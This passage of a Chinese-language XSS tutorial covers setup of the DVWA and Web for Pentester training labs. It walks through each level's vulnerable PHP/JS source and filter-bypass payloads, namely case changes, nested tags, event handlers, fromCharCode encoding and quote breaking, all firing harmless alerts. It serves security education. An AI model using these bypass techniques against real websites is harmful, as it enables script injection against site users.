class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">'6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">'6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'</span>;</span><br></pre></td></tr></table></figure><p>我本地使用的是<code>PHPStudy</code>搭建的环境，找到<code>PHP扩展及设置</code>-<code>参数开关设置</code>，勾选</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen</span><br><span class="line">allow_url_include</span><br></pre></td></tr></table></figure><p>浏览器访问<code>DVWA</code>的目录来进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/setup.php</span><br></pre></td></tr></table></figure><p>点击<code>Create / Reset Databas</code>创建数据库，接着跳转到登录界面。</p><p>默认的账户名为：<strong>admin</strong>，密码为：<strong>password</strong></p><h2 id="XSS小游戏"><a href="#XSS小游戏" class="headerlink" title="XSS小游戏"></a>XSS小游戏</h2><p><strong>项目地址</strong>：<a href="https://github.com/sqlsec/xssgame" target="_blank" rel="noopener">https://github.com/sqlsec/xssgame</a></p><p><strong>安装方法</strong>：直接解压源码到HTTP服务的目录下，浏览器直接访问即可，无需配置数据库等信息</p><h1 id="WebforPentester习题讲解"><a href="#WebforPentester习题讲解" class="headerlink" title="WebforPentester习题讲解"></a>WebforPentester习题讲解</h1><h2 id="第1关-无任何过滤"><a href="#第1关-无任何过滤" class="headerlink" title="第1关 无任何过滤"></a>第1关 无任何过滤</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name变量直接通过GET方式传进去，然后通过echo输出。</p><p><strong>payload</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="第2关-大小写绕过"><a href="#第2关-大小写绕过" class="headerlink" title="第2关 大小写绕过"></a>第2关 大小写绕过</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $name =  $_GET[&quot;name&quot;];</span><br><span class="line">        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);</span><br><span class="line">        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用了preg_replace函数来过滤<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签，这里由于正则缺陷，没有考虑到大小写的情况，所以这里可以用大小写转换绕过。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/scripT&gt;</span><br><span class="line"># 也可以双写嵌套</span><br><span class="line">example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/scr&lt;/script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><h2 id="第3关-嵌套绕过"><a href="#第3关-嵌套绕过" class="headerlink" title="第3关 嵌套绕过"></a>第3关 嵌套绕过</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $name =  $_GET[&quot;name&quot;];</span><br><span class="line">        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);</span><br><span class="line">        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里在第2关的基础上面，正则规则上面使用了<code>/i</code>，表示不区分大小写，利用这个特点可以构造一个嵌套的标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>被检测到<code>&lt;script&gt;</code>后，替换为了空（即删掉）就变成了一个完整的标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;XSS&apos;)&lt;/&lt;/script&gt;script&gt;</span><br></pre></td></tr></table></figure><h2 id="第4关-其他标签绕过"><a href="#第4关-其他标签绕过" class="headerlink" title="第4关 其他标签绕过"></a>第4关 其他标签绕过</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">if (preg_match(&apos;/script/i&apos;, $_GET[&quot;name&quot;])) &#123;</span><br><span class="line">  die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</span><br></pre></td></tr></table></figure><p>对script关键词进行了不区分大小写地过滤，匹配到就直接调用<code>die(&quot;error&quot;)</code>终止程序运行，因此上述的方法就不再适用，但是还可以通过其他许多标签来触发JS事件。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example4.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><h2 id="第5关-编码或者其他方法绕过"><a href="#第5关-编码或者其他方法绕过" class="headerlink" title="第5关 编码或者其他方法绕过"></a>第5关 编码或者其他方法绕过</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">if (preg_match(&apos;/alert/i&apos;, $_GET[&quot;name&quot;])) &#123;</span><br><span class="line">  die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</span><br></pre></td></tr></table></figure><p>对alert关键词进行了不区分大小写地过滤，可以使用其他类似alert的方法来弹窗</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example5.php?name=&lt;script&gt;confirm(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">example5.php?name=&lt;script&gt;prompt(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>也可以通过<code>String.fromCharCode()</code>编码来绕过，使用Hackbar可以很方便地进行编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;XSS&apos;)</span><br></pre></td></tr></table></figure><p>经过String.fromCharCode()编码为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="第6关-闭合双引号"><a href="#第6关-闭合双引号" class="headerlink" title="第6关 闭合双引号"></a>第6关 闭合双引号</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过GET方式传入的name变量，直接输出在了<code>script</code>标签里面，可以尝试闭合前面的双引号<code>&quot;</code>，然后直接调用<code>alert</code>方法来弹窗，末尾再使用双引号<code>&quot;</code>闭合后面的双引号。</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?name=&quot;;alert(&apos;XSS&apos;);&quot;</span><br></pre></td></tr></table></figure><p>也可以尝试通过<code>//</code>直接注释掉后面的双引号<code>&quot;</code>，这样就不用考虑闭合了：</p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?name=&quot;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure><h2 id="第7关-闭合单引号"><a href="#第7关-闭合单引号" class="headerlink" title="第7关 闭合单引号"></a>第7关 闭合单引号</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var $a= &apos;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>和上一题类似，只是这里的最后是通过<code>htmlentities()</code> 函数把字符转换为 HTML 实体，然后再输出单引号修饰的a变量中。<code>htmlentities()</code>会将双引号<code>&quot;</code> 特殊编码，但是却它不编码单引号<code>&#39;</code>，恰巧这里是通过单引号<code>&#39;</code>给a变量赋值的，所以依然可以通过闭合单引号<code>&#39;</code>来弹窗。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example7.php?name=&apos;;alert(&apos;XSS&apos;);&apos;</span><br><span class="line">example7.php?name=&apos;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure><h2 id="第8关-PHP-SELF"><a href="#第8关-PHP-SELF" class="headerlink" title="第8关 PHP_SELF"></a>第8关 PHP_SELF</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">  if (isset($_POST[&quot;name&quot;])) &#123;</span><br><span class="line">    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure><p>name变量通过form表单以POST方式传入，然后通过<code>htmlentities</code>函数是实体化后输出来，这次通过POST方式传入的name变量是比较安全的，暂时无法突破。重点分析这里<code>&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;</code>，用户依然可以控制参数<strong>PHP_SELF</strong> ，并且这里没有过滤直接输入到了<code>form</code>标签中，所以这里通过闭合依然可以XSS。</p><p>闭合引号和标签，通过<code>&lt;script&gt;</code>标签来弹窗：</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example8.php/&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;//</span><br></pre></td></tr></table></figure><p>也可以通过闭合引号，通过事件来触发弹窗：</p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example8.php/&quot; onclick=alert(&apos;XSS&apos;)//</span><br></pre></td></tr></table></figure><h2 id="第9关-location-hash"><a href="#第9关-location-hash" class="headerlink" title="第9关 location.hash"></a>第9关 location.hash</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  document.write(location.hash.substring(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接通过<code>location.hash</code>传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性，往网页中写入JS代码。要了解这个<code>location.hash</code>属性，可以参考W3C的这篇资料：<a href="http://www.w3school.com.cn/jsref/prop_loc_hash.asp" target="_blank" rel="noopener">HTML DOM hash 属性</a></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example9.php#&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>执行完成后，手动刷新下浏览器，经测试在Chrome和FireFox浏览器上的尖括号会被自动转码，在<code>IE</code>内核的浏览器上可以正常运行</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200804113440.png" alt="20200804113440"></p><h1 id="DVWA习题讲解"><a href="#DVWA习题讲解" class="headerlink" title="DVWA习题讲解"></a>DVWA习题讲解</h1><h2 id="反射-XSS-LOW"><a href="#反射-XSS-LOW" class="headerlink" title="反射 XSS LOW"></a>反射 XSS LOW</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看看到对<code>name</code>变量没有任何的过滤措施，只是单纯的检测了<code>name</code>变量存在并且不为空就直接输出到了网页中。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="反射-XSS-Medium"><a href="#反射-XSS-Medium" class="headerlink" title="反射 XSS Medium"></a>反射 XSS Medium</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只是简单的过滤了<code>&lt;script&gt;</code>标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。</p><p>使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了：</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><p>因为过滤规则的缺陷，这里可以使用嵌套构造来绕过：</p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：</p><p><strong>payload3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="反射-XSS-high"><a href="#反射-XSS-high" class="headerlink" title="反射 XSS high"></a>反射 XSS high</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果：</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><h2 id="反射-XSS-Impossible"><a href="#反射-XSS-Impossible" class="headerlink" title="反射 XSS Impossible"></a>反射 XSS Impossible</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>name</code>变量通过<code>htmlspecialchars()</code>函数被HTML实体化后输出在了<code>&lt;pre&gt;</code>标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。</p><blockquote><p><code>$name = htmlspecialchars( $_GET[ &#39;name&#39; ] );</code>这个实体化函数可以修复上面三个级别</p></blockquote><h2 id="DOM-XSS-LOW"><a href="#DOM-XSS-LOW" class="headerlink" title="DOM XSS LOW"></a>DOM XSS LOW</h2><p><strong>源码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"vulnerable_code_area"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"XSS"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"default"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">                    if (document.location.href.indexOf("default=") &gt;= 0) &#123;</span></span><br><span class="line"><span class="undefined">                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span></span><br><span class="line"><span class="xml">                        document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                        document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">                    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Select"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DOM XSS是通过修改页面的DOM节点形成的XSS。首先通过选择语言后然后往页面中创建了新的DOM节点：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span><br><span class="line">document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span><br></pre></td></tr></table></figure><p>这里的<code>lang</code>变量通过<code>document.location.href</code>来获取到，并且没有任何过滤就直接URL解码后输出在了<code>&lt;option&gt;</code>标签中，以下payload在<code>Firefox Developer Edition 56.0b9</code>版本的浏览器测试成功</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM-XSS-Medium"><a href="#DOM-XSS-Medium" class="headerlink" title="DOM XSS Medium"></a>DOM XSS Medium</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 